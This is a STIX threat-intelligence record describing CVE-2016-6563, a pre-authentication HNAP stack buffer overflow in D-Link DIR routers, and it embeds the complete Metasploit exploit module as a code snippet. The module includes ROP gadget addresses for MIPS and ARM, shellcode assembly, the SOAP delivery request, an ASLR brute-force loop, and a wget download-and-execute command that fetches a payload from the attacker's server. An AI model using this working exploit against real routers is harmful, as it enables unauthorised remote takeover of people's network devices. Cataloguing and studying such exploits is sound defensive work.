{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c2e0eb9-5abf-412b-b7d3-d4c37ebb6e47",
    "created": "2024-08-14T17:00:49.602388Z",
    "modified": "2024-08-14T17:00:49.602395Z",
    "name": "Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow",
    "description": " Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol which accepts arbitrarily long strings into certain XML parameters and then copies them into the stack. This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and this vulnerability is present in both MIPS and ARM devices. The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a few load and store instructions. Because of this the payloads have to be sent unencoded, which can cause them to fail, although the bind shell seems to work well. For the ARM devices, the inline reverse tcp seems to work best. Check the reference links to see the vulnerable firmware versions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_hnap_login_bof.rb",
            "external_id": "dlink_hnap_login_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6563"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Nov/38"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Payload working status:\n# MIPS:\n#   - all valid payloads working (the ones that we are able to send without null bytes)\n# ARM:\n#  - inline rev/bind shell works (bind... meh sometimes)\n#  - stager rev/bind shell FAIL\n#  - meterpreter rev/bind fails with sigsegv standalone, but works under strace or gdb...\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow',\n      'Description'    => %q{\n        Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which\n        is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol,\n        which accepts arbitrarily long strings into certain XML parameters and then copies them into\n        the stack.\n        This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested\n        using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and\n        this vulnerability is present in both MIPS and ARM devices.\n        The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a\n        few load and store instructions. Because of this the payloads have to be sent unencoded, which\n        can cause them to fail, although the bind shell seems to work well.\n        For the ARM devices, the inline reverse tcp seems to work best.\n        Check the reference links to see the vulnerable firmware versions.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['linux'],\n      'References'     =>\n        [\n          ['CVE', '2016-6563'],\n          ['US-CERT-VU', '677427'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt'],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Nov/38']\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 10 },\n      'Stance'         => Msf::Exploit::Stance::Aggressive,          # we need this to run in the foreground (ARM target)\n      'Targets'        =>\n        [\n          [ 'Dlink DIR-818 / 822 / 823 / 850 [MIPS]',\n            {\n              'Offset'         => 3072,\n              'LibcBase'       => 0x2aabe000,         # should be the same offset for all firmware versions and all routers\n              'Sleep'          => 0x56DF0,            # sleep() offset into libuClibc-0.9.30.3.so\n              'FirstGadget'    => 0x4EA1C,            # see comments below for gadget information\n              'SecondGadget'   => 0x2468C,\n              'ThirdGadget'    => 0x41f3c,\n              'PrepShellcode1' => \"\\x23\\xbd\\xf3\\xc8\", # addi  sp,sp,-3128\n              'PrepShellcode2' => \"\\x03\\xa0\\xf8\\x09\", # jalr  sp\n              'BranchDelay'    => \"\\x20\\x84\\xf8\\x30\", # addi  a0,a0,-2000 (nop)\n              'Arch'           => ARCH_MIPSBE,\n              'Payload'        =>\n                {\n                  'BadChars' => \"\\x00\",\n                  'EncoderType'     => Msf::Encoder::Type::Raw      # else it will fail with SIGILL, this CPU is crippled\n                },\n            }\n          ],\n          [ 'Dlink DIR-868 (rev. B and C) / 880 / 885 / 890 / 895 [ARM]',\n            {\n              'Offset'         => 1024,\n              'LibcBase'       => 0x400DA000,         # we can pick any xyz in 0x40xyz000 (an x of 0/1 works well)\n              'System'         => 0x5A270,            # system() offset into libuClibc-0.9.32.1.so\n              'FirstGadget'    => 0x18298,            # see comments below for gadget information\n              'SecondGadget'   => 0x40CB8,\n              'Arch'           => ARCH_ARMLE,\n            }\n          ],\n        ],\n      'DisclosureDate'  => '2016-11-07',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('SLEEP', [true, 'Seconds to sleep between requests (ARM only)', '0.5']),\n        OptString.new('SRVHOST', [true, 'IP address for the HTTP server (ARM only)', '0.0.0.0']),\n        OptString.new('SRVPORT', [true, 'Port for the HTTP server (ARM only)', '3333']),\n        OptString.new('SHELL', [true, 'Don\\'t change this', '/bin/sh']),\n        OptString.new('SHELLARG', [true, 'Don\\'t change this', 'sh']),\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri'     => '/HNAP1/',\n        'method'  => 'POST',\n        'Content-Type' => 'text/xml',\n        'headers' => { 'SOAPAction' => 'http://purenetworks.com/HNAP1/Login' }\n      })\n\n      if res && res.code == 500\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def calc_encode_addr (offset, big_endian = true)\n    if big_endian\n      [(target['LibcBase'] + offset).to_s(16)].pack('H*')\n    else\n      [(target['LibcBase'] + offset).to_s(16)].pack('H*').reverse\n    end\n  end\n\n  def prepare_shellcode_arm (cmd)\n    #All these gadgets are from /lib/libuClibc-0.9.32.1.so, which is the library used for all versions of firmware for all ARM routers\n\n    #first_gadget (pops system() address into r3, and second_gadget into PC):\n    #.text:00018298                 LDMFD           SP!, {R3,PC}\n\n    #second_gadget (puts the stack pointer into r0 and calls system() at r3):\n    #.text:00040CB8                 MOV             R0, SP\n    #.text:00040CBC                 BLX             R3\n\n    #system() (Executes argument in r0 (our stack pointer)\n    #.text:0005A270 system\n\n    #The final payload will be:\n    #'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() + second_gadget + command\n    shellcode = rand_text_alpha(target['Offset']) +       # filler\n      \"\\xff\\xff\\xff\\xff\" +                                # n integer overwrite (see advisory)\n      rand_text_alpha(16) +                               # moar filler\n      rand_text_alpha(4) +                                # r11\n      calc_encode_addr(target['FirstGadget'], false) +    # first_gadget\n      calc_encode_addr(target['System'], false) +         # system() address\n      calc_encode_addr(target['SecondGadget'], false) +   # second_gadget\n      cmd                                                 # our command\n  end\n\n  def prepare_shellcode_mips\n    #All these gadgets are from /lib/libuClibc-0.9.30.3.so, which is the library used for all versions of firmware for all MIPS routers\n\n    #<sleep> is at 56DF0\n\n    #first gadget - execute sleep and call second_gadget\n    #.text:0004EA1C                 move    $t9, $s0 <- sleep()\n    #.text:0004EA20                 lw      $ra, 0x20+var_4($sp) <- second_gadget\n    #.text:0004EA24                 li      $a0, 2 <- arg for sleep()\n    #.text:0004EA28                 lw      $s0, 0x20+var_8($sp)\n    #.text:0004EA2C                 li      $a1, 1\n    #.text:0004EA30                 move    $a2, $zero\n    #.text:0004EA34                 jr      $t9\n    #.text:0004EA38                 addiu   $sp, 0x20\n\n    #second gadget - put stack pointer in a1:\n    #.text:0002468C                 addiu   $s1, $sp, 0x58\n    #.text:00024690                 li      $s0, 0x44\n    #.text:00024694                 move    $a2, $s0\n    #.text:00024698                 move    $a1, $s1\n    #.text:0002469C                 move    $t9, $s4\n    #.text:000246A0                 jalr    $t9\n    #.text:000246A4                 move    $a0, $s2\n\n    #third gadget - call $a1 (stack pointer):\n    #.text:00041F3C                 move    $t9, $a1\n    #.text:00041F40                 move    $a1, $a2\n    #.text:00041F44                 addiu   $a0, 8\n    #.text:00041F48                 jr      $t9\n    #.text:00041F4C                 nop\n\n    #When the crash occurs, the stack pointer is at xml_tag_value[3128]. In order to have a larger space for the shellcode (2000+ bytes), we can jump back to the beggining of the buffer.\n      #prep_shellcode_1:  23bdf7a8  addi  sp,sp,-3128\n      #prep_shellcode_2:  03a0f809  jalr  sp\n      #branch_delay:    2084f830  addi  a0,a0,-2000\n\n    #The final payload will be:\n    #shellcode + 'a' * (2064 - shellcode.size) + sleep() + '%31' * 4 + '%32' * 4 + '%33' * 4 + third_gadget + first_gadget + 'b' * 0x1c + second_gadget + 'c' * 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay\n    shellcode = payload.encoded +                                        # exploit\n      rand_text_alpha(target['Offset'] - payload.encoded.length) +       # filler\n      calc_encode_addr(target['Sleep']) +                                # s0\n      rand_text_alpha(4) +                                               # s1\n      rand_text_alpha(4) +                                               # s2\n      rand_text_alpha(4) +                                               # s3\n      calc_encode_addr(target['ThirdGadget']) +                          # s4 (third gadget)\n      calc_encode_addr(target['FirstGadget']) +                          # initial pc / ra (first_gadget)\n      rand_text_alpha(0x1c) +                                            # filler\n      calc_encode_addr(target['SecondGadget']) +                         # second_gadget\n      rand_text_alpha(0x58) +                                            # filler\n      target['PrepShellcode1'] +                                         # exploit prep\n      target['PrepShellcode2'] +                                         # exploit prep\n      target['BranchDelay']                                              # exploit prep\n  end\n\n  def send_payload (payload)\n    begin\n      # the payload can go in the Action, Username, LoginPassword or Captcha XML tag\n      body = %{\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n <soap:Body>\n  <Login xmlns=\"http://purenetworks.com/HNAP1/\">\n   <Action>something</Action>\n   <Username>Admin</Username>\n   <LoginPassword></LoginPassword>\n   <Captcha>#{payload}</Captcha>\n  </Login>\n </soap:Body>\n</soap:Envelope>\n}\n\n      res = send_request_cgi({\n        'uri'     => '/HNAP1/',\n        'method'  => 'POST',\n        'ctype' => 'text/xml',\n        'headers' => { 'SOAPAction' => 'http://purenetworks.com/HNAP1/Login' },\n        'data' => body\n      })\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the router\")\n    end\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{peer} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{peer} - Sending the payload to the device...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  def exploit\n    print_status(\"#{peer} - Attempting to exploit #{target.name}\")\n    if target == targets[0]\n      send_payload(prepare_shellcode_mips)\n    else\n      downfile = rand_text_alpha(8+rand(8))\n      @pl = generate_payload_exe\n      @elf_sent = false\n      resource_uri = '/' + downfile\n\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n      print_status(\"#{peer} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n      print_status(\"#{peer} - Asking the device to download and execute #{service_url}\")\n\n      filename = rand_text_alpha_lower(rand(8) + 2)\n      cmd = \"wget #{service_url} -O /tmp/#{filename}; chmod +x /tmp/#{filename}; /tmp/#{filename} &\"\n\n      shellcode = prepare_shellcode_arm(cmd)\n\n      print_status(\"#{peer} - \\\"Bypassing\\\" the device's ASLR. This might take up to 15 minutes.\")\n      counter = 0.00\n      while (not @elf_sent)\n        if counter % 50.00 == 0 && counter != 0.00\n          print_status(\"#{peer} - Tried #{counter.to_i} times in #{(counter * datastore['SLEEP'].to_f).to_i} seconds.\")\n        end\n        send_payload(shellcode)\n        sleep datastore['SLEEP'].to_f     # we need to be in the LAN, so a low value  (< 1s) is fine\n        counter += 1\n      end\n      print_status(\"#{peer} - The device downloaded the payload after #{counter.to_i} tries / #{(counter * datastore['SLEEP'].to_f).to_i} seconds.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-11-07",
    "x_mitre_platforms": [
        "['linux']"
    ]
}